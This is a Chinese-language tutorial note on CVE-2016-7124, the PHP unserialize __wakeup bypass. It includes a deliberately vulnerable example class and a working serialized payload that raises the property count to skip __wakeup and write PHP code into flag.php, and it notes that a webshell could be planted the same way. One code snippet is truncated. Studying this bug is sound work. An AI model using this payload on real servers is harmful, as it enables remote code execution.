**漏洞成因**

今天学习反序列化的时候，看到cve-2016-7124的这个漏洞，漏洞产生的原因是因为可以修改属性数的大小跳过wakeup的执行，何为wakeup呢？

__wakeup是PHP中的一个魔术方法，如果在反序列化一个类的时候，会先检查是否有__wakeup的存在，有的话，会先调用wakeup里面的内容

**利用**

版本限制

PHP5:<5.6.25

PHP7:<7.0.10

代码

class vFREE{ public $name='vFREE'; public $age='18'; function __wakeup(){ $this->age = "18"; } function __destruct(){ $path='flag.php'; $file_get=file_put_contents($path,$this->name); } } $flag = $_GET['flag']; $unser = unserialize($flag);

上面是栗子

**审计一波**

类名:vFREE

类属性:name和age

魔术方法:__wakeup和__destruct

__destruct是析构方法，一般都是最后或者被销毁才会给调用

类外部用到了反序列话函数unserialize，但用到这个函数时，就会像检查类vFREE中有没有__wakeup方法，有的话就执行，没有就跳过，很明显，代码中有wakeup，但是wakeup的内容就是一个赋值操作，并起不了太大的作用，反而destruct中可以利用一波，因为destruct中打开一个flag.php的文件，然后将$this->name的值作为内容写入到flag.php中，假如我们写入一个木马呢，那危害不就上来了么...

我们要传入一个参数flag，并且将传入的值放入反序列化函数中执行，所以我们要传入的应该是一个序列化后的字符串，此时我们应该类vFREE进行序列化，代码如下:

age = "18"; } function __destruct(){ $path='flag.php'; $file_get=file_put_contents($path,$this->name); } } $vfree=new vFREE(); echo serialize($vfree); ?>

序列化后得到

O:5:"vFREE":2:{s:4:"name";s:5:"vFREE";s:3:"age";s:2:"18";}

O即对象的缩写

5即说明类名有五位字符

2即有两个类属性

{}即所有类属性名和内容

s即字符串

4即类属性名有4位字符

name即类属性名字

以此类推...

此时在看代码，发现写入到flag.php中的是$this->name的值，所以，我们要更改name的内容，怎么改呢？把name后面s:5:"vFREE"的vFREE改成你先插入的内容，比如改成,就变成

O:5:"vFREE":2:{s:4:"name";s:18:"<?php phpinfo();?>";s:3:"age";s:2:"18";}

注意，此时s后面的5改成18了，因为一共有18个字符，所以，数值要随着字符数的变化而变化，然后传入即可

当然，此时还是会先执行wakeup方法的，并未先执行destruct，根据开头讲的，更改原有属性值达到绕过过wakeup的效果，此时的类中属性值是2，我们要将2改成其他数字，改成什么都行，反之一定要大于2，比如

O:5:"vFREE":5:{s:4:"name";s:18:"<?php phpinfo();?>";s:3:"age";s:2:"18";}

改成5，就可以绕过了

![image-20250103124443069](C:\Users\test\AppData\Roaming\Typora\typora-user-images\image-20250103124443069.png)

![image-20250103124448841](C:\Users\test\AppData\Roaming\Typora\typora-user-images\image-20250103124448841.png)

成功写入，当然，可以写其他的，自己发挥啦，别干坏事就好了